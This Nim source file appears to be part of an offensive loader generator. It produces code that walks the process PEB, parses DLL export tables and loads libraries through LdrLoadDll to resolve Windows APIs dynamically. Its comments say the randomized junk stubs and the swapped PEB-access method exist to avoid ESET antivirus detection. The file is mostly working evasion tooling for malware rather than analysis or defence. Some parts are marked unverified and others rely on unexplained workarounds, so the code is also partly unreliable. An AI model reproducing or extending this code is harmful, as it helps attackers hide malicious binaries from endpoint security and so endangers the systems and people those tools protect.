
import strformat
import random

# When this function isn't called, all random functions are not random. (https://nim-lang.org/docs/random.html)
randomize()

proc rndStr(length: int): string =
  for _ in .. length:
    add(result, char(rand(int('a') .. int('z'))))

proc getRandStub (): string =
  var randName: string = rndStr(rand(10..25))
  var randValues: string = rndStr(rand(50..250))
  let randstub = fmt"""

var {randName}: string = obf("{randValues}")

"""
  return randstub

proc getRandStubInFunc(): string =
  var randName: string = rndStr(rand(10..25))
  var randValues: string = rndStr(rand(50..250))
  let randstub = fmt"""

  var {randName}: string = obf("{randValues}")

"""
  return randstub


let DInvokeStubfirst * = """

from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
from winim import PWCHAR,PUNICODE_STRING,UNICODE_STRING,PHANDLE,LIST_ENTRY,UCHAR,BYTE,P_PEB,LPWSTR,IMAGE_NT_SIGNATURE,USHORT,IMAGE_FILE_DLL,lstrcmpiW,LPWSTR,PWSTR,RtlInitUnicodeString,ULONG_PTR,MAX_PATH,wchar_t,IMAGE_DATA_DIRECTORY,PCHAR,StrRStrIA
import winim/utils
import winim/winstr

type
  ND_LDR_DATA_TABLE_ENTRY* {.bycopy.} = object
    InMemoryOrderLinks*: LIST_ENTRY
    InInitializationOrderLinks*: LIST_ENTRY
    DllBase*: PVOID
    EntryPoint*: PVOID
    SizeOfImage*: ULONG
    FullDllName*: UNICODE_STRING
    BaseDllName*: UNICODE_STRING

  PND_LDR_DATA_TABLE_ENTRY* = ptr ND_LDR_DATA_TABLE_ENTRY
  ND_PEB_LDR_DATA* {.bycopy.} = object
    Length*: ULONG
    Initialized*: UCHAR
    SsHandle*: PVOID
    InLoadOrderModuleList*: LIST_ENTRY
    InMemoryOrderModuleList*: LIST_ENTRY
    InInitializationOrderModuleList*: LIST_ENTRY

  PND_PEB_LDR_DATA* = ptr ND_PEB_LDR_DATA
  ND_PEB* {.bycopy.} = object
    Reserved1*: array[2, BYTE]
    BeingDebugged*: BYTE
    Reserved2*: array[1, BYTE]
    Reserved3*: array[2, PVOID]
    Ldr*: PND_PEB_LDR_DATA

  PND_PEB* = ptr ND_PEB

type
  LdrLoadDll_t* = proc (PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.stdcall.}


# toDo: Syscall

when defined(DInvoke):


  type
    RtlGetCurrentPeb_t* = proc (): pointer {.stdcall.}
    RtlInitUnicodeString_t* = proc(DestinationString: PUNICODE_STRING, SourceString: PCWSTR): VOID {.stdcall.}

  const
    RtlGetCurrentPeb_HASH * = obf("RtlGetCurrentPeb")
    RtlInitUnicodeString_HASH * = obf("RtlInitUnicodeString")

  var MyRtlGetCurrentPeb*: RtlGetCurrentPeb_t
  var MyRtlInitUnicodeString*: RtlInitUnicodeString_t
  # temporary - to fix later
  proc RtlGetCurrentPeb*(): pointer 
    {.discardable, stdcall, dynlib: "ntdll", importc: "RtlGetCurrentPeb".}

else:
  proc RtlGetCurrentPeb*(): pointer 
    {.discardable, stdcall, dynlib: "ntdll", importc: "RtlGetCurrentPeb".}


#[ This was the older alternative, which was the trigger for ESET to flag the resulting binaries, therefore I replaced that with RtlGetCurrentPeb.
proc GetPPEB(p: culong): P_PEB {. 
    header: 
        '''#include <windows.h>
           #include <winnt.h>''', 
    importc: "__readgsqword"
.}
]#

"""

let DInvokeGetPEB * = fmt"""

proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE
proc get_function_address*(hLibrary: HMODULE; fhash: cstring; ordinal: int, specialCase: BOOL): PVOID
const
  NTDLL_DLL* = obf("ntdll.dll")

proc calcSomething *(): int =
  var rand: int = 0
  for i in 0 .. 10:
    rand += 15
    if ((rand mod 9) != 0):
      rand += 15
  return rand


proc GetPPEB * (p: culong): P_PEB = 
  # We need to put any stuff before and after this function, to avoid an ESET detection. It flags any Nim binary that uses this function alone.
  {getRandStubInFunc()}
  discard calcSomething()
  when defined(DInvoke):
    #MyRtlGetCurrentPeb = cast[RtlGetCurrentPeb_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlGetCurrentPeb_HASH, 0, FALSE)))
    #return cast[P_PEB](MyRtlGetCurrentPeb())
    return cast[P_PEB](RtlGetCurrentPeb())
  else:
    return cast[P_PEB](RtlGetCurrentPeb())
  discard calcSomething()
  {getRandStubInFunc()}

"""

let DInvokeStubSecond * = fmt"""

when defined(WIN64):
  const
    PEB_OFFSET* = 0x30
else:
  const
    PEB_OFFSET* = 0x60

{getRandStub()}

const
  LdrLoadDll_SW2_HASH * = obf("LdrLoadDll")
  MZ* = 0x5A4D


{getRandStub()}

template RVA*(atype: untyped, base_addr: untyped, rva: untyped): untyped = cast[atype](cast[ULONG_PTR](cast[ULONG_PTR](base_addr) + cast[ULONG_PTR](rva)))

template RVA2VA(casttype, dllbase, rva: untyped): untyped =
  cast[casttype](cast[ULONG_PTR](dllbase) + rva)

proc `+`[T](a: ptr T, b: int): ptr T =
    cast[ptr T](cast[uint](a) + cast[uint](b * a[].sizeof))

proc `-`[T](a: ptr T, b: int): ptr T =
    cast[ptr T](cast[uint](a) - cast[uint](b * a[].sizeof))


proc is_dll*(hLibrary: PVOID): BOOL
proc find_legacy_export*(hOriginalLibrary: HMODULE; fhash: cstring): PVOID

{getRandStub()}

proc is_dll*(hLibrary: PVOID): BOOL =
  #echo "IS_DLL start"
  var dosHeader: PIMAGE_DOS_HEADER
  var ntHeader: PIMAGE_NT_HEADERS
  if (hLibrary == nil):
    when defined(verbose):
        echo "[-] hLibrary == 0, exiting"
    return FALSE
  dosHeader = cast[PIMAGE_DOS_HEADER](hLibrary)
  #echo "Got dos Header"
  ##  check the MZ magic bytes
  if dosHeader.e_magic != MZ:
    when defined(verbose):
        echo "[-] No Magic bytes found"
    return FALSE
  #nt = RVA(PIMAGE_NT_HEADERS, hLibrary, dosHeader.e_lfanew)
  ntHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](hLibrary) + dosHeader.e_lfanew)
  #echo "Got NT Headers"
  ##  check the NT_HEADER signature
  if ntHeader.Signature != IMAGE_NT_SIGNATURE:
    when defined(verbose):
        echo "[-] Nt Header signature wrong, exiting"
    return FALSE
  var Characteristics: USHORT = ntHeader.FileHeader.Characteristics
  if (Characteristics and IMAGE_FILE_DLL) != IMAGE_FILE_DLL:
    when defined(verbose):
        echo "[-] Characteristics shows this is not an DLL, exiting"
    return FALSE
  #echo "Everything fine, this is indeed a DLL"
  return TRUE


##
##  Get the base address of a DLL
##
{getRandStub()}


proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE =
  when defined(verbose):
      echo "\r\n[*] Parsing the PEB to search for the target DLL\r\n"
      echo "[*] Searching for: ", LibName
  var Peb: PPEB = GetPPEB(PEB_OFFSET)
  var Ldr = Peb.Ldr
  var FirstEntry: PVOID = addr(Ldr.InMemoryOrderModuleList.Flink)
  var Entry: PND_LDR_DATA_TABLE_ENTRY = cast[PND_LDR_DATA_TABLE_ENTRY](Ldr.InMemoryOrderModuleList.Flink)
  while true:
    var compare: int = lstrcmpiW(LibName,cast[LPWSTR](Entry.BaseDllName.Buffer))
    if(compare == 0):
      when defined(verbose):
          echo "\r\n[+] Found the DLL!\r\n"
      return cast[HANDLE](Entry.DllBase)
    Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
    if not (Entry != FirstEntry):
      when defined(verbose):
          echo "DLL not found for the current proc, loading."
      break
  if (DoLoad == FALSE):
    when defined(verbose):
        echo "Exit, loading is not appreciated"
    return 0
  {getRandStubInFunc()}
  var MyLdrLoadDll: LdrLoadDll_t = cast[LdrLoadDll_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), LdrLoadDll_SW2_HASH, 0, TRUE)))
  
  if MyLdrLoadDll == nil:
    when defined(verbose):
        echo "[-] Address of LdrLoadDll not found"
    return 0

  var ModuleFileName: UNICODE_STRING
  
  var hLibrary: HANDLE = 0

"""

let DInvokeStubThird * = """
  when defined(DInvoke):
    var MyRtlInitUnicodeString: RtlInitUnicodeString_t = cast[RtlInitUnicodeString_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlInitUnicodeString_HASH, 0, TRUE)))
    MyRtlInitUnicodeString(addr(ModuleFileName), LibName)
  else:
    RtlInitUnicodeString(addr(ModuleFileName), LibName)

  #RtlInitUnicodeString(&ModuleFileName, LibName)
  #echo fmt"Copyied {LibName} into {ModuleFileName} "
  #echo "Error after:", $GetLastError()
  
  ##  load the library
  var status: NTSTATUS = MyLdrLoadDll(nil, 0, &ModuleFileName, &hLibrary)
  
  if (status != 0):
    when defined(verbose):
        echo fmt"[-] Failed to load {Libname}, status: {status}\n"
    if (hLibrary == 0):
        when defined(verbose):
            echo "HLibrary still null"
    return 0
  else:
    when defined(verbose):
        echo fmt"Loaded {LibName} successfully!"
  when defined(verbose):
      echo fmt"[+] Loaded {LibName} at {hLibrary}"
  return hLibrary

"""

let DInvokeStubFourth * = fmt"""

# We need a function here, that does the same than StrStrIA but manually without Windows APIs
# It has to compare two char arrays and return true if the first one contains the second one
proc manualStrStrIA*(haystack: cstring; needle: cstring): int32 =
  var i: int = 0
  var j: int = 0
  var k: int = 0
  var found: bool = false
  while (i < haystack.len):
    if (haystack[i].toLowerAscii() == needle[j].toLowerAscii()):
      j += 1
      if (j == needle.len):
        found = true
        break
    else:
      j = 0
    i += 1
  return found


##
##  Find an export in a DLL
##
{getRandStub()}

proc get_function_address*(hLibrary: HMODULE; fhash: cstring; ordinal: int, specialCase: BOOL): PVOID =
  var dos: PIMAGE_DOS_HEADER
  var nt: PIMAGE_NT_HEADERS
  #var data: PIMAGE_DATA_DIRECTORY
  var data: array[0..15, IMAGE_DATA_DIRECTORY]
  var exp: PIMAGE_EXPORT_DIRECTORY
  var exp_size: DWORD
  var adr: PDWORD
  var ord: PDWORD
  var functionAddress: PVOID
  var toCheckLibrary: PVOID = cast[PVOID](hLibrary)
  if (is_dll(toCheckLibrary) == FALSE):
    when defined(verbose):
        echo "[-] Exiting, not a DLL"
    return nil
  dos = cast[PIMAGE_DOS_HEADER](hLibrary)
  nt = RVA(PIMAGE_NT_HEADERS, cast[PVOID](hLibrary), dos.e_lfanew)
  
  data = nt.OptionalHeader.DataDirectory
  
  if (data[0].Size == 0 or data[0].VirtualAddress == 0):
    when defined(verbose):
        echo "[-] Data size == 0 or no VirtualAddress"
    return nil
  exp = RVA(PIMAGE_EXPORT_DIRECTORY, hLibrary, data[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
  exp_size = data[0].Size

  adr = RVA2VA(PDWORD, cast[DWORD_PTR](hLibrary), exp.AddressOfFunctions)
  ord = RVA2VA(PDWORD, cast[DWORD_PTR](hLibrary), exp.AddressOfNameOrdinals)
  
  functionAddress = nil
  {getRandStubInFunc()}
  var numofnames = cast[DWORD](exp.NumberOfNames)
  var functions = RVA2VA(PDWORD, cast[PVOID](hLibrary), exp.AddressOfFunctions)
  #var ordinalbase: DWORD = exp.AddressOfFunctions + 0x10
  #var ordinalsRVA: DWORD = exp.AddressOfFunctions + 0x24
  var addressOfFunctionsvalue = RVA2VA(PDWORD, cast[PVOID](hLibrary), exp.AddressOfFunctions)[]
  var names = RVA2VA(PDWORD, cast[PVOID](hLibrary), exp.AddressOfNames)[]

  when defined(verbose):
      echo "\r\n[*] Checking DLL's Export Directory for the target function\r\n"

  if fhash != "":
    ##  iterate over all the exports
    #var i: DWORD = 0

    for i in 0 .. numofnames:
      # Getting the function name value
      var funcname = RVA2VA(cstring, cast[PVOID](hLibrary), names)
      #echo funcname
      var finalfunctionAddress = RVA(PVOID, cast[PVOID](hLibrary), addressOfFunctionsvalue)
      
      var checkpoint: cstring = obf(".")

      # We are comparing against function names, which include "." because for some reason all function names in this loop also contain references to other DLLs, e.g. "api-ms-win-core-libraryloader-l1-1-0.AddDllDirectory" in kernel32.dll
      #var test = StrRStrIA(cast[LPCSTR](funcname),nil,cast[LPCSTR]("."))
      var test = manualStrStrIA(funcname,checkpoint)

      if test != 0:
        # As we found a trash (indirect reference, normally this is in the address field and not in the names field) function, we have to increase this value -> Not an official function
        numofnames = numofnames + 1
      else:
        functions = functions + 1
        addressOfFunctionsvalue = functions[]
      #when defined(verbose): echo "Relative Address: ", toHex(functions[])
      names += cast[DWORD](len(funcname) + 1)
      #when defined(verbose): echo "Function: ", funcname
      if fhash == funcname:
        
        # So many edge cases, have to investigate
        if (funcname == obf("CreateFileW")):
          functions = functions - 1
        if (funcname == obf("SetFileInformationByHandle")):
          functions = functions - 1
        if (funcname == obf("CloseHandle")):
          functions = functions - 1
        if (funcname == obf("GetModuleFileNameW")):
          functions = functions - 1
        if (funcname == obf("GetConsoleWindow")):
          functions = functions - 1
        if (funcname == obf("ShowWindow")):
          functions = functions + 4
        when defined(verbose):
            echo "\r\n[+] Found API call: ",funcname
        when defined(verbose):
            echo "\r\n"
        # Strange. For ntdll functions the following is needed, but for kernel32 functions it's not. Don't ask me why. This is a workaround for the moment. Need to troubleshoot.
        if (specialCase):
          # Why?
          when defined(verbose):
              echo "This is a special case, subtract one function"
          finalfunctionAddress = RVA(PVOID, cast[PVOID](hLibrary), addressOfFunctionsvalue)
        when defined(verbose):
            echo "Relative Address: ", toHex(functions[])
        functions = functions - 1
        when defined(verbose):
            echo "Relative Address one before: ", toHex(functions[])
        functions = functions + 2
        when defined(verbose):
            echo "Relative Address one after: ", toHex(functions[])
        functionAddress = finalfunctionAddress
        break
  else:
    # Add the ordinal number e.g. 1034 for OpenProcess and - the EXP Base address
    when defined(verbose):
        echo fmt"Getting address via ordinal"
    functions = functions + ordinal - 1
    functionAddress = RVA(PVOID, hLibrary, functions[])
    when defined(verbose):
        echo "Relative Address: ", toHex(functions[])
    #echo "Function address via ordinal:"
    #echo repr(functionAddress)
    {getRandStubInFunc()}
  if functionAddress == nil:
    return nil
  else:
    return functionAddress

##
##  Look among all loaded DLLs for an export with certain function hash
##

# Not verified working yet
proc find_legacy_export*(hOriginalLibrary: HMODULE; fhash: cstring): PVOID =
  var functionAddress: PVOID
  {getRandStubInFunc()}
  var Peb: PPEB = GetPPEB(PEB_OFFSET)
  #var Peb: PPEB = GetPEB()
  {getRandStubInFunc()}
  var Ldr = Peb.Ldr
  var FirstEntry: PVOID = addr(Ldr.InMemoryOrderModuleList.Flink)
  var Entry: PND_LDR_DATA_TABLE_ENTRY = cast[PND_LDR_DATA_TABLE_ENTRY](Ldr.InMemoryOrderModuleList.Flink)
  while Entry != FirstEntry:
    ##  avoid looking in the DLL that brought us here
    if Entry.DllBase == cast[PVOID](hOriginalLibrary):
      Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
      continue
    functionAddress = get_function_address(cast[HMODULE](Entry.DllBase), fhash, 0, FALSE)
    if functionAddress == nil:
      Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
      continue
    return functionAddress
    Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
  return nil

"""